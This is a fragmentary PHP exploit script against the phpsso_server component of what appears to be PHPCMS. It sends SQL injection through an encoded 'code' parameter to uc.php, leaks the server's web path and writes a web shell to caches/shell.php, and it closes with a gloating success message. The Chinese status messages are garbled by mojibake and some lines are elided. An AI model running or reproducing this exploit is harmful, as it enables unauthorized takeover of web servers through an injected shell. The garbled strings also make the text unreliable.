...
echo "[1]  http://".$host.$p."phpsso_server/api/uc.php?code=".$SQL."\n";
...
echo "[2] ִSQLע©"."\n";
echo "[3]  http://".$host.$p."phpsso_server/api/logout.php \n";
...
//print_r($matches);
if(!empty($matches)){
echo "[4] õweb· " . $matches[0]."\n";
echo "[5] дļ ". str_replace("\\","/",$matches[0]) ."caches/shell.php"."\n";
...
$SQL = urlencode(authcode($SQL, "ENCODE", ""));
echo "[6]  http://".$host.$p."phpsso_server/api/uc.php?code=".$SQL."\n";
$packet ="GET ".$p."phpsso_server/api/uc.php?code=".$SQL." HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
...
echo "[6]  http://".$host.$p."phpsso_server/caches/shell.php"."\n";
...
echo "[7] phpinfoɹshella ! enjoy it :)";
}
}else{
echo "[-]δȡweb· :(";
}
